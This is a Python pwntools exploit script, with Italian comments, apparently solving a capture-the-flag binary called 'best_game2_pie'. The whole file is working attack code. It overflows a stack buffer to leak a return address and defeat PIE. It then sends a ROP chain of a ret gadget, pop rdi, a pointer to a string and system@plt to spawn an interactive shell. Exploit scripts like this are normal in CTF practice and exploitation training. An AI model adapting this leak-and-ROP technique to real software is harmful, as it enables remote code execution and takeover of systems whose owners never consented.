#!/usr/bin/env python3
from pwn import *

EXE_FILENAME='./tbg_files/the_best_game/bg2_pie_docker/best_game2_pie'

exe = context.binary = ELF(EXE_FILENAME)

# libc = exe.libc
argv = [EXE_FILENAME]
envp = {}

EIP_OFFSET = 40
POP_RDI = 0x0000000000000a63 #ropper --file ./best_game2_pie --search 'pop rdi'
RET = POP_RDI+1


"""
FIND MAIN OFFSET


$ objdump -d best_game2_pie | grep "<quiz>"
 9ed:   e8 b8 fe ff ff          call   8aa <quiz>


Esploriamo inq uale offset andremo una volta che quiz ritorna

$ objdump -d best_game2_pie --start-address=0x9ed:

$ 00000000000009ed <main+0x63>:
 9ed:   e8 b8 fe ff ff          call   8aa <quiz>
 9f2:   b8 00 00 00 00          mov    $0x0,%eax

"""

def start():
	gdbscript = '''
	b *(quiz+1)
	continue
	telescope
	'''
	if args.GDB:
		return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
	else:
		return process(argv=argv, env=envp)

io = start()


io.sendlineafter(b'# ', (b'a'*(EIP_OFFSET-1)) ) # sendline() aggiunge automaticamente un byte finale \n
io.recvuntil(b'aaaa\n')
l = io.clean()
i = l.find(b'Is it')

log.info(f"Received data: {l}")
log.info(f"Index of 'Is it': {i}")

assert i > 0
leak = l[:i].ljust(8, b'\x00')

log.info(f"Leak: {leak}") # ret address in stack (random) , and this is the ret main

prog_base = u64(leak) - 0x9f2 # offset return from quiz()

log.info(f"Program base address: {hex(prog_base)}")

io.sendline(
    			 b'a'*EIP_OFFSET 
                 + p64(prog_base+RET) #to align the stack 
                 + p64(prog_base+POP_RDI) 
                 + p64(prog_base+exe.symbols.no_more_spawn_shell_ahahah) 
                 + p64(prog_base+exe.plt.system)
            )


io.sendlineafter(b'# ', b'HZD')
io.interactive()